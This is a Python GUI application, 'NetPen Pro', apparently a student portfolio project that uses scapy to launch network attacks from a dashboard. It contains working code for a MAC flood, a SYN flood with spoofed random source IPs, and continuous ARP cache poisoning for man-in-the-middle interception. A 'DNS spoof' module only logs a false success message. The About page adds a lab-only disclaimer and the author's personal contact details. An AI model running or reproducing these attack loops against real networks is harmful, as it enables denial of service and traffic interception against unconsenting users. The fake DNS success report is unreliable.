import customtkinter as ctk
import threading
import time
import datetime
import logging
import os
import platform
import webbrowser
import queue
import sys
from scapy.all import Ether, IP, TCP, ARP, sendp, send, conf, RandMAC, RandIP, RandShort

class Colors:
    """Enterprise tactical cybersecurity color palette."""
    BACKGROUND = "#070B13"
    SURFACE = "#0E1624"
    CARD = "#131E2F"
    SIDEBAR = "#0A1120"
    HEADER = "#111C2E"
    BORDER = "#22324D"
    PRIMARY = "#3B82F6"      
    PRIMARY_HOVER = "#2563EB"    
    SUCCESS = "#22C55E"
    WARNING = "#F59E0B"
    DANGER = "#EF4444"
    INFO = "#38BDF8"
    TEXT = "#F8FAFC"
    MUTED = "#64748B"
    TERMINAL_BG = "#030509"
class AppConfig:
    """Application configuration and constants."""
    TITLE = "NetPen Pro"
    VERSION = "1.0 Enterprise"
    LOG_DIR = "logs"
    LOG_FILE = "netpen.log"
if not os.path.exists(AppConfig.LOG_DIR):
    os.makedirs(AppConfig.LOG_DIR)
logging.basicConfig(
    filename=os.path.join(AppConfig.LOG_DIR, AppConfig.LOG_FILE),
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
class AttackManager:
    """
    Manages background attack operations. 
    Strictly isolated from UI components. Communicates via thread-safe queues.
    """
    def __init__(self, ui_queue: queue.Queue):
        self.ui_queue = ui_queue
        self.stop_event = threading.Event()
        self.packet_count = 0
        self.ip_hidden = False
        self.mac_hidden = False
        self.current_attack = "None"
        self.selected_interface = "None"
        self.start_time = 0

    def log(self, message: str, level: str = "INFO"):
        """Logs to file and enqueues formatted message for the UI."""
        if level == "ERROR":
            logging.error(message)
        elif level == "WARNING":
            logging.warning(message)
        else:
            logging.info(message)            
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        formatted_message = f"[{timestamp}] [{level}] {message}\n"
        self.ui_queue.put({"type": "log", "msg": formatted_message, "level": level})
    def monitor_speed(self):
        """Background daemon to calculate packets per second and runtime."""
        while not self.stop_event.is_set():
            count_before = self.packet_count
            time.sleep(1)
            pps = self.packet_count - count_before
            elapsed = int(time.time() - self.start_time) if self.start_time > 0 else 0
            
            self.ui_queue.put({
                "type": "stats",
                "pkts": self.packet_count,
                "pps": pps,
                "elapsed": elapsed
            })
    def start_attack_init(self, attack_name: str, iface: str = "None"):
        """Prepares state and triggers the monitoring thread."""
        self.stop_event.clear()
        self.packet_count = 0
        self.current_attack = attack_name
        self.selected_interface = iface
        self.start_time = time.time()
        
        self.ui_queue.put({"type": "status", "status": "RUNNING", "desc": f"Executing tactical module: {attack_name}"})
        threading.Thread(target=self.monitor_speed, daemon=True).start()

    def run_mac_flood(self, iface: str):
        try:
            self.start_attack_init("MAC Flood", iface)
            self.log(f"Initializing MAC Flood on interface: {iface}", "INFO")
            
            def task():
                while not self.stop_event.is_set():
                    try:
                        src_mac = RandMAC() if self.mac_hidden else "00:11:22:33:44:55"
                        sendp(Ether(src=src_mac, dst="FF:FF:FF:FF:FF:FF"), iface=iface, verbose=False)
                        self.packet_count += 1
                    except Exception as e:
                        self.log(f"Transmission error: {str(e)}", "ERROR")
                        break
            
            threading.Thread(target=task, daemon=True).start()
        except Exception as e:
            self.log(f"Failed to start MAC Flood: {str(e)}", "ERROR")

    def run_syn_flood(self, target: str, port: int):
        try:
            self.start_attack_init("SYN Flood")
            self.log(f"Initializing SYN Flood targeting {target}:{port}", "INFO")
            
            def task():
                while not self.stop_event.is_set():
                    try:
                        src_ip = RandIP() if self.ip_hidden else "192.168.1.1"
                        send(IP(src=src_ip, dst=target)/TCP(sport=RandShort(), dport=int(port), flags="S"), verbose=False)
                        self.packet_count += 1
                    except Exception as e:
                        self.log(f"Transmission error: {str(e)}", "ERROR")
                        break
            
            threading.Thread(target=task, daemon=True).start()
        except Exception as e:
            self.log(f"Failed to start SYN Flood: {str(e)}", "ERROR")

    def run_arp_spoof(self, target_ip: str, gateway_ip: str, iface: str):
        try:
            self.start_attack_init("ARP Spoof", iface)
            self.log(f"Initializing ARP Spoof: Target {target_ip} <-> Gateway {gateway_ip}", "INFO")
            
            def task():
                while not self.stop_event.is_set():
                    try:
                        sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=RandMAC()), iface=iface, verbose=False)
                        self.packet_count += 1
                    except Exception as e:
                        self.log(f"Transmission error: {str(e)}", "ERROR")
                        break
                        
            threading.Thread(target=task, daemon=True).start()
        except Exception as e:
            self.log(f"Failed to start ARP Spoof: {str(e)}", "ERROR")

    def run_dns_spoof(self, target_domain: str, fake_ip: str):
        try:
            self.start_attack_init("DNS Spoof")
            self.log(f"DNS Spoof rules deployed: Map {target_domain} -> {fake_ip}", "SUCCESS")
        except Exception as e:
            self.log(f"DNS Spoof failure: {str(e)}", "ERROR")

    def stop_attack(self):
        """Halts all active tasks safely."""
        self.stop_event.set()
        self.current_attack = "None"
        self.start_time = 0
        self.ui_queue.put({"type": "stats", "pkts": self.packet_count, "pps": 0, "elapsed": 0})
        self.ui_queue.put({"type": "status", "status": "STOPPED", "desc": "Attack cycle cleanly halted. Pipeline empty."})
        self.log("All tasks and attack operations cleanly halted.", "WARNING")

class SplashScreen(ctk.CTk):
    """
    Initial loading screen. Features strict lifecycle management to prevent 
    dangling callbacks if closed early by the user.
    """
    def __init__(self, on_ready_callback):
        super().__init__()
        self.on_ready_callback = on_ready_callback
        self.title("Initializing...")
        self.geometry("550x380")
        self.overrideredirect(True)
        self.configure(fg_color=Colors.BACKGROUND)
        self.protocol("WM_DELETE_WINDOW", self._on_close)
        self._anim_id = None
        
        # Center screen
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        x = (screen_width // 2) - (550 // 2)
        y = (screen_height // 2) - (380 // 2)
        self.geometry(f"550x380+{x}+{y}")
        
        self.main_frame = ctk.CTkFrame(self, fg_color=Colors.SURFACE, border_width=1, border_color=Colors.BORDER, corner_radius=6)
        self.main_frame.pack(fill="both", expand=True, padx=2, pady=2)

        self.title_label = ctk.CTkLabel(self.main_frame, text="NETPEN PRO", font=ctk.CTkFont(family="Segoe UI", size=32, weight="bold"), text_color=Colors.TEXT)
        self.title_label.pack(pady=(50, 5))

        self.subtitle_label = ctk.CTkLabel(self.main_frame, text="ENTERPRISE SECURITY TOOLKIT", font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"), text_color=Colors.PRIMARY)
        self.subtitle_label.pack(pady=(0, 20))

        self.status_label = ctk.CTkLabel(self.main_frame, text="Loading Core Modules...", font=ctk.CTkFont(family="Consolas", size=12), text_color=Colors.MUTED)
        self.status_label.pack(pady=(60, 10))
        
        self.progress_bar = ctk.CTkProgressBar(self.main_frame, width=350, height=4, progress_color=Colors.PRIMARY, fg_color=Colors.CARD, corner_radius=0)
        self.progress_bar.set(0.0)
        self.progress_bar.pack(pady=10)
        
        self.steps = [
            ("Loading Environment Modules...", 0.2),
            ("Applying Security Policies...", 0.4),
            ("Loading Scapy Engines...", 0.6),
            ("Initializing Component Frames...", 0.8),
            ("System Ready.", 1.0)
        ]
        self.current_step = 0
        self.animate_loading()

    def _on_close(self):
        """Safely tears down the splash screen without firing lingering events."""
        if self._anim_id:
            try:
                self.after_cancel(self._anim_id)
            except Exception:
                pass
        try:
            self.withdraw()
            self.destroy()
        except Exception:
            pass
        finally:
            os._exit(0)

    def animate_loading(self):
        if self.current_step < len(self.steps):
            text, progress = self.steps[self.current_step]
            self.status_label.configure(text=text)
            self.progress_bar.set(progress)
            self.current_step += 1
            self._anim_id = self.after(500, self.animate_loading)
        else:
            self._anim_id = self.after(300, self.complete_splash)

    def complete_splash(self):
        if self._anim_id:
            try:
                self.after_cancel(self._anim_id)
            except Exception:
                pass
        self.destroy()
        self.on_ready_callback()

class NetPenPro(ctk.CTk):
    """
    Main application framework. Validated for absolute thread safety,
    clean Tcl lifecycles, and compatible CustomTkinter element declarations.
    """
    def __init__(self):
        super().__init__()
        self.title(f"{AppConfig.TITLE} - {AppConfig.VERSION}")
        self.geometry("1400x900")
        self.configure(fg_color=Colors.BACKGROUND)
        self.protocol("WM_DELETE_WINDOW", self._on_closing)
        self._is_running = True
        self._queue_id = None
        self._clock_id = None
        self.ui_queue = queue.Queue()
        self.attacker = AttackManager(ui_queue=self.ui_queue)
        self.total_packets_sent = 0
        self.current_pps = 0
        self.elapsed_time = 0
        try:
            self.ifaces_map = {i.description: i.name for i in conf.ifaces.values() if i.description}
            if not self.ifaces_map:
                self.ifaces_map = {f"Interface {i}": i for i in range(len(conf.ifaces))}
        except Exception:
            self.ifaces_map = {"Default Loopback": "lo"}

        # UI Initialization
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)
        
        self._build_sidebar()
        self.right_container = ctk.CTkFrame(self, fg_color="transparent")
        self.right_container.grid(row=0, column=1, sticky="nsew")
        self.right_container.grid_rowconfigure(1, weight=1)
        self.right_container.grid_columnconfigure(0, weight=1) 
        self._build_header()
        self.main_content = ctk.CTkFrame(self.right_container, fg_color=Colors.BACKGROUND, corner_radius=0, border_width=0)
        self.main_content.grid(row=1, column=0, sticky="nsew", padx=20, pady=10)
        
        self._build_terminal_view()
        self._build_footer()
        self.render_page("DASHBOARD")
        self._queue_id = self.after(100, self._process_ui_queue)
        self._clock_id = self.after(1000, self._update_clock_loop)
        
        self.ui_queue.put({"type": "log", "msg": "System booted cleanly. Ready for tasking.\n", "level": "INFO"})

    def _on_closing(self):
        """Strict teardown sequence preventing Tkinter errors and resource leaks."""
        self._is_running = False
        self.attacker.stop_attack()
        
        if self._queue_id:
            try:
                self.after_cancel(self._queue_id)
            except Exception:
                pass
        if self._clock_id:
            try:
                self.after_cancel(self._clock_id)
            except Exception:
                pass
            
        try:
            self.withdraw()
            self.destroy()
        except Exception:
            pass
        finally:
            os._exit(0)

    def _process_ui_queue(self):
        """Processes messages dispatched from background threads to update GUI safely."""
        if not self._is_running: 
            return

        try:
            while True:
                data = self.ui_queue.get_nowait()
                msg_type = data.get("type")
                
                if msg_type == "log":
                    self._terminal_append(data.get("msg"), data.get("level"))
                
                elif msg_type == "stats":
                    self.total_packets_sent = data.get("pkts", 0)
                    self.current_pps = data.get("pps", 0)
                    self.elapsed_time = data.get("elapsed", 0)
                    
                    if hasattr(self, 'lbl_stat_packets') and self.lbl_stat_packets.winfo_exists():
                        self.lbl_stat_packets.configure(text=str(self.total_packets_sent))
                    if hasattr(self, 'lbl_stat_pps') and self.lbl_stat_pps.winfo_exists():
                        self.lbl_stat_pps.configure(text=f"{self.current_pps} P/s")
                    if hasattr(self, 'lbl_stat_runtime') and self.lbl_stat_runtime.winfo_exists():
                        self.lbl_stat_runtime.configure(text=f"{self.elapsed_time} Sec")
                        
                elif msg_type == "status":
                    self._set_system_status(data.get("status"), data.get("desc"))
                    
        except queue.Empty:
            pass
        finally:
            if self._is_running and self.winfo_exists():
                self._queue_id = self.after(100, self._process_ui_queue)

    def _update_clock_loop(self):
        """Independent UI thread loop specifically for the clock widget."""
        if not self._is_running:
            return
            
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(self, 'lbl_stat_clock') and self.lbl_stat_clock.winfo_exists():
            self.lbl_stat_clock.configure(text=current_time)
            
        if self._is_running and self.winfo_exists():
            self._clock_id = self.after(1000, self._update_clock_loop)

    def _terminal_append(self, msg: str, level: str):
        if not self.terminal.winfo_exists(): return
        self.terminal.configure(state="normal")
        self.terminal.insert("end", msg, level)
        self.terminal.see("end")
        self.terminal.configure(state="disabled")

    def _build_sidebar(self):
        self.sidebar = ctk.CTkFrame(self, fg_color=Colors.SIDEBAR, corner_radius=0, width=240, border_width=1, border_color=Colors.BACKGROUND)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_propagate(False)

        brand_lbl = ctk.CTkLabel(self.sidebar, text="NETPEN PRO", font=ctk.CTkFont("Segoe UI", 20, "bold"), text_color=Colors.TEXT)
        brand_lbl.pack(pady=(25, 2), padx=20, anchor="w")
        
        sub_lbl = ctk.CTkLabel(self.sidebar, text="ENTERPRISE TOOLKIT", font=ctk.CTkFont("Segoe UI", 10, "bold"), text_color=Colors.MUTED)
        sub_lbl.pack(pady=(0, 35), padx=20, anchor="w")

        self.nav_buttons = {}
        nav_items = [
            ("DASHBOARD", "■"),
            ("MAC FLOOD", "▶"),
            ("SYN FLOOD", "▶"),
            ("ARP SPOOF", "▶"),
            ("DNS SPOOF", "▶"),
            ("ABOUT", "ℹ")
        ]

        for text, icon in nav_items:
            btn = ctk.CTkButton(
                self.sidebar,
                text=f"  {icon}   {text}",
                anchor="w",
                width=200,
                height=40,
                corner_radius=4,
                border_width=0,
                fg_color="transparent",
                hover_color=Colors.SURFACE,
                text_color=Colors.MUTED,
                font=ctk.CTkFont("Segoe UI", 12, "bold"),
                command=lambda t=text: self.render_page(t)
            )
            btn.pack(pady=4, padx=20)
            self.nav_buttons[text] = btn

    def _build_header(self):
        self.header = ctk.CTkFrame(self.right_container, height=65, fg_color=Colors.HEADER, corner_radius=6, border_width=1, border_color=Colors.BORDER)
        self.header.grid(row=0, column=0, sticky="ew", padx=20, pady=(20, 10))
        self.header.pack_propagate(False)

        self.page_title = ctk.CTkLabel(self.header, text="DASHBOARD", font=ctk.CTkFont("Segoe UI", 14, "bold"), text_color=Colors.TEXT)
        self.page_title.pack(side="left", padx=25)
        self.badge_frame = ctk.CTkFrame(self.header, fg_color="transparent", border_color=Colors.WARNING, border_width=1, corner_radius=10)
        self.badge_frame.pack(side="right", padx=25)
        
        badge = ctk.CTkLabel(self.badge_frame, text=" LAB ENVIRONMENT ONLY ", text_color=Colors.WARNING, font=ctk.CTkFont("Segoe UI", 10, "bold"))
        badge.pack(padx=12, pady=2)

    def _build_terminal_view(self):
        term_wrapper = ctk.CTkFrame(self.right_container, fg_color="transparent")
        term_wrapper.grid(row=2, column=0, sticky="ew", padx=20, pady=(0, 10))
        
        top_bar = ctk.CTkFrame(term_wrapper, fg_color="transparent")
        top_bar.pack(fill="x", pady=(0, 5))
        
        ctk.CTkLabel(top_bar, text="SECURITY AUDIT LOG", font=ctk.CTkFont("Segoe UI", 10, "bold"), text_color=Colors.MUTED).pack(side="left", padx=5)
        
        clear_btn = ctk.CTkButton(
            top_bar, text="Clear Logs", width=80, height=24, fg_color="transparent", border_color=Colors.BORDER, border_width=1, hover_color=Colors.SURFACE, text_color=Colors.TEXT,
            font=ctk.CTkFont("Segoe UI", 11), corner_radius=4,
            command=lambda: [self.terminal.configure(state="normal"), self.terminal.delete(1.0, "end"), self.terminal.configure(state="disabled")]
        )
        clear_btn.pack(side="right", padx=5)

        self.terminal = ctk.CTkTextbox(
            term_wrapper,
            height=160,
            fg_color=Colors.TERMINAL_BG,
            text_color=Colors.TEXT,
            font=ctk.CTkFont("Consolas", 13),
            border_width=1,
            border_color=Colors.BORDER,
            corner_radius=4
        )
        self.terminal.pack(fill="x")
        self.terminal.tag_config("INFO", foreground=Colors.INFO)
        self.terminal.tag_config("WARNING", foreground=Colors.WARNING)
        self.terminal.tag_config("ERROR", foreground=Colors.DANGER)
        self.terminal.tag_config("SUCCESS", foreground=Colors.SUCCESS)
        
        self.terminal.configure(state="disabled")

    def _build_footer(self):
        self.footer = ctk.CTkFrame(self.right_container, height=45, fg_color=Colors.SURFACE, border_width=1, border_color=Colors.BORDER, corner_radius=6)
        self.footer.grid(row=3, column=0, sticky="ew", padx=20, pady=(0, 20))
        self.footer.pack_propagate(False)
        self.status_indicator_frame = ctk.CTkFrame(self.footer, fg_color="transparent", border_width=1, border_color=Colors.SUCCESS, corner_radius=10)
        self.status_indicator_frame.pack(side="left", padx=15, pady=10)
        
        self.status_indicator = ctk.CTkLabel(self.status_indicator_frame, text=" READY ", font=ctk.CTkFont("Segoe UI", 10, "bold"), text_color=Colors.SUCCESS)
        self.status_indicator.pack(padx=12, pady=2)

        self.status_text_lbl = ctk.CTkLabel(self.footer, text="System initialized safely. Awaiting task assignment.", font=ctk.CTkFont("Segoe UI", 11), text_color=Colors.MUTED)
        self.status_text_lbl.pack(side="left", padx=5)

    def _set_system_status(self, status: str, description: str = ""):
        if not self._is_running: return
        colors = {
            "READY": Colors.SUCCESS,
            "RUNNING": Colors.WARNING,
            "STOPPED": Colors.DANGER,
            "ERROR": Colors.DANGER
        }
        color = colors.get(status, Colors.MUTED)
        
        if hasattr(self, 'status_indicator_frame') and self.status_indicator_frame.winfo_exists():
            self.status_indicator_frame.configure(border_color=color)
        if hasattr(self, 'status_indicator') and self.status_indicator.winfo_exists():
            self.status_indicator.configure(text=f" {status} ", text_color=color)
        if description and hasattr(self, 'status_text_lbl') and self.status_text_lbl.winfo_exists():
            self.status_text_lbl.configure(text=description)

    def _create_card(self, parent, title, initial_value, row, col):
        """Creates a standardized professional tactical dashboard metric card."""
        card = ctk.CTkFrame(parent, fg_color=Colors.CARD, border_width=1, border_color=Colors.BORDER, corner_radius=6)
        card.grid(row=row, column=col, padx=12, pady=12, sticky="nsew")
        
        lbl_title = ctk.CTkLabel(card, text=title.upper(), font=ctk.CTkFont("Segoe UI", 11, "bold"), text_color=Colors.MUTED)
        lbl_title.pack(anchor="w", padx=20, pady=(15, 2))

        lbl_val = ctk.CTkLabel(card, text=initial_value, font=ctk.CTkFont("Consolas", 24, "bold"), text_color=Colors.TEXT)
        lbl_val.pack(anchor="w", padx=20, pady=(0, 15))
        def on_enter(e):
            if card.winfo_exists():
                card.configure(border_color=Colors.PRIMARY)
        def on_leave(e):
            if card.winfo_exists():
                card.configure(border_color=Colors.BORDER)
            
        for widget in [card, lbl_title, lbl_val]:
            widget.bind("<Enter>", on_enter)
            widget.bind("<Leave>", on_leave)
            
        return lbl_val

    def _create_entry(self, parent, placeholder):
        """Creates a standardized tactical input entry."""
        return ctk.CTkEntry(
            parent, placeholder_text=placeholder, width=500, height=40,
            fg_color=Colors.BACKGROUND, border_color=Colors.BORDER, 
            text_color=Colors.TEXT, placeholder_text_color=Colors.MUTED,
            corner_radius=4, font=ctk.CTkFont("Consolas", 13)
        )

    def _create_combo(self, parent, values):
        """Creates a standardized tactical combo box."""
        return ctk.CTkComboBox(
            parent, values=values, width=500, height=40,
            fg_color=Colors.BACKGROUND, border_color=Colors.BORDER, text_color=Colors.TEXT,
            button_color=Colors.SURFACE, button_hover_color=Colors.PRIMARY, dropdown_fg_color=Colors.CARD,
            corner_radius=4, font=ctk.CTkFont("Consolas", 13)
        )

    def render_page(self, action: str):
        """Destroys current view and paints the requested page securely."""
        for widget in self.main_content.winfo_children():
            widget.destroy()
            
        self.page_title.configure(text=action)
        for btn_text, btn_obj in self.nav_buttons.items():
            if btn_text == action:
                btn_obj.configure(fg_color=Colors.CARD, text_color=Colors.PRIMARY)
            else:
                btn_obj.configure(fg_color="transparent", text_color=Colors.MUTED)

        if action == "DASHBOARD":
            self.main_content.grid_columnconfigure((0, 1, 2), weight=1)
            self.main_content.grid_rowconfigure((0, 1), weight=1)
            
            self.lbl_stat_packets = self._create_card(self.main_content, "Total Packets", str(self.total_packets_sent), 0, 0)
            self.lbl_stat_pps = self._create_card(self.main_content, "Throughput", f"{self.current_pps} P/s", 0, 1)
            self.lbl_stat_runtime = self._create_card(self.main_content, "Pipeline Uptime", f"{self.elapsed_time}s", 0, 2)

            current_status = self.attacker.current_attack if self.attacker.current_attack != "None" else "LISTENING / IDLE"
            self._create_card(self.main_content, "Active Module", current_status, 1, 0)
            self._create_card(self.main_content, "Mapped Interface", self.attacker.selected_interface, 1, 1)
            self.lbl_stat_clock = self._create_card(self.main_content, "System Clock", "", 1, 2)

        elif action == "MAC FLOOD":
            frame = ctk.CTkFrame(self.main_content, fg_color="transparent")
            frame.pack(expand=True, fill="both", padx=40, pady=40)

            ctk.CTkLabel(frame, text="CAM Table Overload (MAC Flood)", font=ctk.CTkFont("Segoe UI", 18, "bold"), text_color=Colors.TEXT).pack(anchor="w", pady=(0, 5))
            ctk.CTkLabel(frame, text="Floods the switch topology with randomized frames to trigger fail-open state.", font=ctk.CTkFont("Segoe UI", 13), text_color=Colors.MUTED).pack(anchor="w", pady=(0, 30))

            c = self._create_combo(frame, list(self.ifaces_map.keys()))
            c.pack(anchor="w", pady=10)

            sw = ctk.CTkSwitch(frame, text="Enable Source Address Obfuscation (RandMAC)", font=ctk.CTkFont("Segoe UI", 13), progress_color=Colors.PRIMARY, button_color=Colors.TEXT)
            sw.pack(anchor="w", pady=15)

            btn_run = ctk.CTkButton(frame, text="INITIALIZE MAC FLOOD PIPELINE", fg_color=Colors.PRIMARY, hover_color=Colors.PRIMARY_HOVER, text_color=Colors.TEXT, font=ctk.CTkFont("Segoe UI", 12, "bold"), height=40, width=280, corner_radius=4,
                                    command=lambda: [setattr(self.attacker, 'mac_hidden', sw.get()), self.attacker.run_mac_flood(self.ifaces_map.get(c.get()))])
            btn_run.pack(anchor="w", pady=25)

        elif action == "SYN FLOOD":
            frame = ctk.CTkFrame(self.main_content, fg_color="transparent")
            frame.pack(expand=True, fill="both", padx=40, pady=40)

            ctk.CTkLabel(frame, text="TCP SYN Exhaustion", font=ctk.CTkFont("Segoe UI", 18, "bold"), text_color=Colors.TEXT).pack(anchor="w", pady=(0, 5))
            ctk.CTkLabel(frame, text="Performs layer-4 stateful connection starvation via rapid synchronization requests.", font=ctk.CTkFont("Segoe UI", 13), text_color=Colors.MUTED).pack(anchor="w", pady=(0, 30))

            ip = self._create_entry(frame, "Target Endpoint IP (e.g., 10.0.0.5)")
            ip.pack(anchor="w", pady=8)

            p = self._create_entry(frame, "Target Port (e.g., 443)")
            p.pack(anchor="w", pady=8)

            sw = ctk.CTkSwitch(frame, text="Randomize Source IPv4 Mapping (RandIP)", font=ctk.CTkFont("Segoe UI", 13), progress_color=Colors.PRIMARY, button_color=Colors.TEXT)
            sw.pack(anchor="w", pady=15)

            btn_run = ctk.CTkButton(frame, text="EXECUTE TCP ATTACK VECTOR", fg_color=Colors.PRIMARY, hover_color=Colors.PRIMARY_HOVER, text_color=Colors.TEXT, font=ctk.CTkFont("Segoe UI", 12, "bold"), height=40, width=280, corner_radius=4,
                                    command=lambda: [setattr(self.attacker, 'ip_hidden', sw.get()), self.attacker.run_syn_flood(ip.get(), p.get())])
            btn_run.pack(anchor="w", pady=25)

        elif action == "ARP SPOOF":
            frame = ctk.CTkFrame(self.main_content, fg_color="transparent")
            frame.pack(expand=True, fill="both", padx=40, pady=40)

            ctk.CTkLabel(frame, text="ARP Cache Poisoning", font=ctk.CTkFont("Segoe UI", 18, "bold"), text_color=Colors.TEXT).pack(anchor="w", pady=(0, 5))
            ctk.CTkLabel(frame, text="Alters local ARP tables to establish an illicit Man-in-the-Middle junction.", font=ctk.CTkFont("Segoe UI", 13), text_color=Colors.MUTED).pack(anchor="w", pady=(0, 30))

            target = self._create_entry(frame, "Target Victim IP Address")
            target.pack(anchor="w", pady=8)

            gw = self._create_entry(frame, "Default Gateway IP Address")
            gw.pack(anchor="w", pady=8)

            c = self._create_combo(frame, list(self.ifaces_map.keys()))
            c.pack(anchor="w", pady=8)

            btn_run = ctk.CTkButton(frame, text="DEPLOY ARP INTERCEPT", fg_color=Colors.PRIMARY, hover_color=Colors.PRIMARY_HOVER, text_color=Colors.TEXT, font=ctk.CTkFont("Segoe UI", 12, "bold"), height=40, width=280, corner_radius=4,
                                    command=lambda: self.attacker.run_arp_spoof(target.get(), gw.get(), self.ifaces_map.get(c.get())))
            btn_run.pack(anchor="w", pady=25)

        elif action == "DNS SPOOF":
            frame = ctk.CTkFrame(self.main_content, fg_color="transparent")
            frame.pack(expand=True, fill="both", padx=40, pady=40)

            ctk.CTkLabel(frame, text="DNS Resolution Redirection", font=ctk.CTkFont("Segoe UI", 18, "bold"), text_color=Colors.TEXT).pack(anchor="w", pady=(0, 5))
            ctk.CTkLabel(frame, text="Forges mapping parameters inside ongoing system query processes.", font=ctk.CTkFont("Segoe UI", 13), text_color=Colors.MUTED).pack(anchor="w", pady=(0, 30))

            domain = self._create_entry(frame, "Target Domain (e.g., secure.local)")
            domain.pack(anchor="w", pady=8)

            ip = self._create_entry(frame, "Redirection IP Address")
            ip.pack(anchor="w", pady=8)

            btn_run = ctk.CTkButton(frame, text="INJECT DNS RULES", fg_color=Colors.PRIMARY, hover_color=Colors.PRIMARY_HOVER, text_color=Colors.TEXT, font=ctk.CTkFont("Segoe UI", 12, "bold"), height=40, width=280, corner_radius=4,
                                    command=lambda: self.attacker.run_dns_spoof(domain.get(), ip.get()))
            btn_run.pack(anchor="w", pady=25)

        elif action == "ABOUT":
            frame = ctk.CTkScrollableFrame(self.main_content, fg_color="transparent")
            frame.pack(expand=True, fill="both", padx=40, pady=40)

            ctk.CTkLabel(frame, text="ABOUT NETPEN PRO", font=ctk.CTkFont("Segoe UI", 18, "bold"), text_color=Colors.TEXT).pack(anchor="w", pady=(0, 5))
            ctk.CTkLabel(frame, text=f"Educational Network Security Toolkit - {AppConfig.VERSION}", font=ctk.CTkFont("Segoe UI", 13), text_color=Colors.PRIMARY).pack(anchor="w", pady=(0, 20))

            desc_text = (
                "This application architecture has been engineered explicitly as a clean, integrated laboratory portfolio project "
                "intended exclusively for authorized validation exercises, defensive systems audit modeling, and university graduation "
                "presentation environments. All networking actions require complete administrative clearance and loopback isolation "
                "prior to runtime deployment."
            )
            lbl_desc = ctk.CTkLabel(frame, text=desc_text, font=ctk.CTkFont("Segoe UI", 13), text_color=Colors.MUTED, justify="left", wraplength=700)
            lbl_desc.pack(anchor="w", pady=(0, 30))
            
            dev_panel = ctk.CTkFrame(frame, fg_color=Colors.CARD, border_width=1, border_color=Colors.BORDER, corner_radius=6)
            dev_panel.pack(fill="x", pady=10)

            ctk.CTkLabel(dev_panel, text="ENGINEERING LEAD", font=ctk.CTkFont("Segoe UI", 11, "bold"), text_color=Colors.MUTED).pack(anchor="w", padx=25, pady=(20, 2))
            ctk.CTkLabel(dev_panel, text="Fares Mohamed", font=ctk.CTkFont("Segoe UI", 16, "bold"), text_color=Colors.TEXT).pack(anchor="w", padx=25, pady=2)
            ctk.CTkLabel(dev_panel, text="Software Engineer | Python Developer | Security Architect", font=ctk.CTkFont("Consolas", 12), text_color=Colors.PRIMARY).pack(anchor="w", padx=25, pady=(2, 20))

            ctk.CTkLabel(frame, text="CONNECTIVITY LINKS", font=ctk.CTkFont("Segoe UI", 11, "bold"), text_color=Colors.MUTED).pack(anchor="w", pady=(30, 10))

            links_frame = ctk.CTkFrame(frame, fg_color="transparent")
            links_frame.pack(fill="x", pady=5)
            
            social_channels = [
                ("GitHub", "https://github.com/FaresMohamed6"),
                ("LinkedIn", "https://www.linkedin.com/in/faresmohamed5"),
                ("Telegram", "https://t.me/FaressMohamed11"),
                ("WhatsApp", "https://api.whatsapp.com/send/?phone=201033463740"),
                ("X Platform", "https://x.com/FERSKA432007")
            ]

            for name, link in social_channels:
                btn = ctk.CTkButton(
                    links_frame, text=name, fg_color=Colors.SURFACE, border_width=1, border_color=Colors.BORDER, hover_color=Colors.CARD, text_color=Colors.TEXT,
                    font=ctk.CTkFont("Segoe UI", 11, "bold"), width=120, height=35, corner_radius=4,
                    command=lambda l=link: webbrowser.open_new_tab(l)
                )
                btn.pack(side="left", padx=(0, 10))
        if action not in ["ABOUT", "DASHBOARD"]:
            ctk.CTkButton(
                self.main_content, text="ABORT ACTIVE OPERATIONS", fg_color="transparent", border_color=Colors.DANGER, border_width=1, hover_color="#260C10", text_color=Colors.DANGER,
                font=ctk.CTkFont("Segoe UI", 11, "bold"), height=38, width=280, corner_radius=4,
                command=self.attacker.stop_attack
            ).pack(pady=30, side="bottom")


def run_application_pipeline():
    """Boots the integrated architecture securely."""
    ctk.set_appearance_mode("dark")
    
    def launch_main_system():
        main_app = NetPenPro()
        main_app.mainloop()

    splash_context = SplashScreen(on_ready_callback=launch_main_system)
    splash_context.mainloop()


if __name__ == "__main__":
    run_application_pipeline()